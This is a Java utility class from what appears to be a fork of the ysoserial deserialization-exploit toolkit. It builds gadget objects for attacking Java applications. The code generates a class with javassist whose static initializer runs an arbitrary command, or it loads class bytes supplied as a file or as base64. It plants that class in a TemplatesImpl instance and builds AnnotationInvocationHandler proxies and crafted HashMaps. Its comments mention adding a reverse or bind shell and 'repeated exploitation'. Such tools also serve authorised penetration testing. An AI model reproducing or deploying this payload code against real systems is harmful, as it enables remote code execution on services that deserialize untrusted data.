package yso.payloads.util;


import yso.GeneratePayload;
import yso.payloads.custom.CustomCommand;
import yso.payloads.custom.TemplatesImplUtil;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtField;

import java.lang.reflect.*;
import java.util.HashMap;
import java.util.Map;

import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;


/*
 * utility generator functions for common jdk-only gadgets
 */
@SuppressWarnings ( {
        "restriction", "rawtypes", "unchecked"
} )
public class Gadgets {

    static {
        // special case for using TemplatesImpl gadgets with a SecurityManager enabled
        System.setProperty(DESERIALIZE_TRANSLET, "true");

        // for RMI remote loading
        System.setProperty("java.rmi.server.useCodebaseOnly", "false");
    }

    public static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";


    public static <T> T createMemoitizedProxy ( final Map<String, Object> map, final Class<T> iface, final Class<?>... ifaces ) throws Exception {
        return createProxy(createMemoizedInvocationHandler(map), iface, ifaces);
    }


    public static InvocationHandler createMemoizedInvocationHandler ( final Map<String, Object> map ) throws Exception {
        return (InvocationHandler) Reflections.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
    }


    public static <T> T createProxy ( final InvocationHandler ih, final Class<T> iface, final Class<?>... ifaces ) {
        final Class<?>[] allIfaces = (Class<?>[]) Array.newInstance(Class.class, ifaces.length + 1);
        allIfaces[ 0 ] = iface;
        if ( ifaces.length > 0 ) {
            System.arraycopy(ifaces, 0, allIfaces, 1, ifaces.length);
        }
        return iface.cast(Proxy.newProxyInstance(Gadgets.class.getClassLoader(), allIfaces, ih));
    }


    public static Map<String, Object> createMap ( final String key, final Object val ) {
        final Map<String, Object> map = new HashMap<String, Object>();
        map.put(key, val);
        return map;
    }


    public static Object createTemplatesImpl ( final String command ) throws Exception {
        if ( Boolean.parseBoolean(System.getProperty("properXalan", "false")) ) {
            return createTemplatesImpl(
                    command,
                    Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
                    Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"),
                    Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"));
        }
        // 是否压缩
        if(GeneratePayload.ysoConfig.isCompress()){
            return createCompressTemplatesImpl(command);
        }else{
            return createTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
        }
    }


    public static <T> T createTemplatesImpl ( final String command, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory )
            throws Exception {
        final T templates = tplClass.newInstance();
        byte[] classBytes = null;
        String tmplClazzName = "T" + System.nanoTime();
        ClassPool pool = new ClassPool();
        // use template gadget class
        pool.insertClassPath(new ClassClassPath(abstTranslet));

        if(command.toLowerCase().startsWith(CustomCommand.COMMAND_CLASS_FILE)){
            classBytes = CommonUtil.readFileByte(command.substring(CustomCommand.COMMAND_CLASS_FILE.length()));
        }else if(command.toLowerCase().startsWith(CustomCommand.COMMAND_CLASS_BASE64)){
            classBytes = new BASE64Decoder().decodeBuffer(command.substring(CustomCommand.COMMAND_CLASS_BASE64.length()));
        } else {
            // run command in static initializer
            // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
            String cmd = TemplatesImplUtil.getCmd(command);
            //final CtClass clazz = pool.get(StubTransletPayload.class.getName());
            final CtClass clazz = pool.makeClass(tmplClazzName);
            clazz.defrost();
            clazz.makeClassInitializer().insertAfter(cmd);
            // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
            CtClass superC = pool.get(abstTranslet.getName());
            clazz.setSuperclass(superC);
            CtClass clsSerializable = pool.get("java.io.Serializable");
            clazz.setInterfaces(new CtClass[]{clsSerializable});
            clazz.addField(CtField.make("private static final long serialVersionUID = -5971610431559700674L;", clazz));
            clazz.getClassFile().setVersionToJava5();
            classBytes = clazz.toBytecode();
        }

        // inject class bytes into instance
        CtClass foo = pool.makeClass("Foo");
        foo.defrost();

        CtClass clsSerializable = pool.get("java.io.Serializable");
        foo.setInterfaces(new CtClass[]{clsSerializable});
        foo.addField(CtField.make("private static final long serialVersionUID = 8207363842866235160L;", foo));
        foo.getClassFile().setVersionToJava5();
        Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
                classBytes, foo.toBytecode()
        });

        // required to make TemplatesImpl happy
        Reflections.setFieldValue(templates, "_name", "P");
        Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());

        // 解决: java.lang.RuntimeException: StubTransletPayload: frozen class (cannot edit) 错误
        //pool.getCtClass(tmplClazzName).defrost();
        //pool.getCtClass("Foo").defrost();
        return templates;
    }

    // Reference: 《缩小ysoserial payload体积的几个方法》 https://xz.aliyun.com/t/6227
    public static Object createCompressTemplatesImpl(final String command) throws Exception {
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        byte[] classBytes = null;
        ClassPool classPool = new ClassPool();
        classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class));

        if(command.toLowerCase().startsWith(CustomCommand.COMMAND_CLASS_FILE)){
            classBytes = CommonUtil.readFileByte(command.substring(CustomCommand.COMMAND_CLASS_FILE.length()));
        }else if(command.toLowerCase().startsWith(CustomCommand.COMMAND_CLASS_BASE64)){
            classBytes = new BASE64Decoder().decodeBuffer(command.substring(CustomCommand.COMMAND_CLASS_BASE64.length()));
        } else {
            CtClass clazz = classPool.makeClass("C");
            clazz.defrost();
            String code = TemplatesImplUtil.getCmd(command);
            clazz.makeClassInitializer().insertAfter(code);
            CtClass superC = classPool.get(AbstractTranslet.class.getName());
            clazz.setSuperclass(superC);
            clazz.getClassFile().setVersionToJava5();
            classBytes = clazz.toBytecode();
        }

        // inject class bytes into instance
        Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {classBytes});
        Reflections.setFieldValue(templates, "_name", "P");

        return templates;
    }

    public static HashMap makeMap ( Object v1, Object v2 ) throws Exception, ClassNotFoundException, NoSuchMethodException, InstantiationException,
            IllegalAccessException, InvocationTargetException {
        HashMap s = new HashMap();
        Reflections.setFieldValue(s, "size", 2);
        Class nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        Reflections.setAccessible(nodeCons);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        Reflections.setFieldValue(s, "table", tbl);
        return s;
    }
}
